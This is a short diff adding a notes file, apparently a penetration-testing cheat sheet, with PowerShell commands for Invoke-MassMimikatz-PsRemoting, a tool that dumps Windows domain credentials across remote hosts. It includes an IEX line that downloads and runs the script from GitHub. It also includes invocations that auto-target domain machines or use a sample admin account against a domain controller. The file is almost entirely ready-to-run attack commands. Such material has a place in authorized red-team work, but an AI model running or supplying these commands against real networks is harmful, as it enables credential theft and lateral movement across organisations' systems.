@@ -1,0 +1,11 @@
+https://blog.netspi.com/auto-dumping-domain-credentials-using-spns-powershell-remoting-and-mimikatz/
+
+Import-Module .\Invoke-MassMimikatz-PsRemoting.psm1
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-MassMimikatz-PsRemoting.psm1')
+
+Invoke-MassMimikatz-PSRemoting -Verbose -hosts "10.1.1.1"
+
+Invoke-MassMimikatz-PSRemoting -Verbose -AutoTarget -MaxHost 5 -WinRM
+
+Invoke-MassMimikatz-PsRemoting -Verbose -AutoTarget -MaxHost 1 -username corp\MyServerAdmin -password 'MyServerPassword!' -DomainController 10.2.9.106 | ft -AutoSize
